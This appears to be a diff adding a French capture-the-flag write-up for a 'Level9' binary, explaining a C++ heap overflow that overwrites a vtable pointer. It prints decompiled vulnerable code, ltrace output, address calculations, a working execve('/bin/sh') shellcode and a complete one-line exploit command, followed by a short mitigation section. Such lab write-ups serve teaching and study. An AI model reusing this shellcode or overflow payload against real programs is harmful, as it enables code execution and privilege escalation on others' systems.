@@ -1,0 +1,148 @@
+# Exploitation de VTable en C++ - Level9
+
+## Analyse du Programme
+
+Le programme présente une vulnérabilité de buffer overflow dans une classe C++. Voici le code source principal :
+
+```cpp
+int main(int argc, char **argv) {
+    if (argc < 2) {
+        exit(1);
+    }
+    
+    N *obj1 = new N(5);        // Premier objet (108 bytes)
+    N *obj2 = new N(6);        // Deuxième objet (108 bytes)
+    
+    obj1->setAnnotation(argv[1]);    // VULNÉRABILITÉ : buffer overflow
+    
+    // Appel de méthode virtuelle via vtable
+    obj2->vtable[0](obj2, obj1);     // Équivalent de obj2->operator+(obj1)
+    
+    return 0;
+}
+
+// Constructeur de la classe N
+void N::N(N *this, int param_1) {
+    this->vtable = &N_vtable;     // Pointeur vtable à l'offset +0
+    this->value = param_1;        // Valeur (5 ou 6) à l'offset +0x68
+}
+
+// Fonction vulnérable
+void N::setAnnotation(N *this, char *param_1) {
+    size_t len = strlen(param_1);
+    memcpy(this + 4, param_1, len);  // Copie SANS vérification de taille !
+}
+```
+
+## Points Clés de Théorie
+
+1. **VTable en C++**
+   - Table de fonctions virtuelles
+   - Contient les pointeurs vers les méthodes virtuelles
+   - Stockée au début de l'objet (offset +0)
+   - Permet le polymorphisme en C++
+
+2. **Structure de l'Objet**
+   - VTable pointer : 4 bytes (offset +0)
+   - Buffer d'annotation : 100 bytes (offset +4)
+   - Valeur : 4 bytes (offset +0x68)
+   - Total : 108 bytes
+
+3. **Techniques d'Exploitation**
+   - Overflow du buffer d'annotation
+   - Écrasement de la vtable
+   - Redirection vers un shellcode
+   - Utilisation de la méthode virtuelle pour exécuter le shellcode
+
+## Étapes de l'Exploitation
+
+### 1. Analyse des Allocations
+
+```bash
+# Utilisation de ltrace pour trouver les adresses
+ltrace ./level9 test
+_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280) = 0x804a008  # obj1
+_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280) = 0x804a078          # obj2
+```
+
+### 2. Calcul des Adresses
+
+- Adresse de obj1 : 0x804a008
+- Adresse de obj2 : 0x804a078
+- Offset entre les objets : 112 bytes
+- Début du buffer : 0x804a008 + 4 = 0x804a00c
+- Adresse du shellcode : 0x804a00c + 4 = 0x804a010
+
+### 3. Construction du Shellcode
+
+```bash
+# Shellcode de 21 bytes
+"\x31\xc9\xf7\xe1\x04\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+```
+
+### 4. Construction de l'Exploit
+
+```bash
+./level9 $(python -c'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x04\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')
+```
+
+Décomposition de l'exploit :
+- `\x10\xa0\x04\x08` : Adresse du shellcode
+- Shellcode : 21 bytes
+- Padding : 83 bytes de "A"
+- `\x0c\xa0\x04\x08` : Adresse du début du buffer
+
+## Explication Technique Détaillée
+
+### Structure de la Mémoire
+
+```
++------------------+  ← 0x804a008 (obj1)
+| VTable pointer   |  4 bytes
++------------------+  ← 0x804a00c
+| Buffer           |  100 bytes
++------------------+  ← 0x804a070
+| Value            |  4 bytes
++------------------+  ← 0x804a078 (obj2)
+| VTable pointer   |  4 bytes
++------------------+
+```
+
+### Processus d'Exploitation
+
+1. **Phase d'Overflow**
+   - Le buffer overflow dans setAnnotation écrase la vtable
+   - Ecris à la place l'addresse du début du buffer de obj1.
+
+2. **Phase d'Exécution**
+   - L'appel à vtable[0] redirige donc en fait vers la première addresse de notre buffer obj1 qui contien lui l'addresse du shellcode.
+   - Comme le code pense faire appel à une vtable, il lit l'addresse contenu au debut de notre buffer et y jump pour executer notre shellcode.
+   - Le shellcode s'exécute avec les privilèges du programme
+
+## Sécurité
+
+Cette vulnérabilité illustre l'importance de :
+- Vérifier les tailles des buffers en C++
+- Protéger les vtables contre les modifications
+- Utiliser des mécanismes de protection comme :
+  - ASLR
+  - NX
+  - Stack Canary
+  - VTable Protection
+
+## Notes Techniques
+
+- Le programme nécessite un argument
+- L'exploitation est possible car :
+  - Pas de vérification de taille dans setAnnotation
+  - Les objets sont alloués de manière contiguë
+  - La vtable est accessible en écriture
+  - NX est désactivé (permettant l'exécution du shellcode)
+
+## Concept Clé : Exploitation de VTable
+
+Cette technique d'exploitation illustre les dangers de :
+- La manipulation non sécurisée de la mémoire en C++
+- L'absence de vérification des limites de buffer
+- L'importance de la protection des structures de données critiques
+- La nécessité de sécuriser les mécanismes de polymorphisme
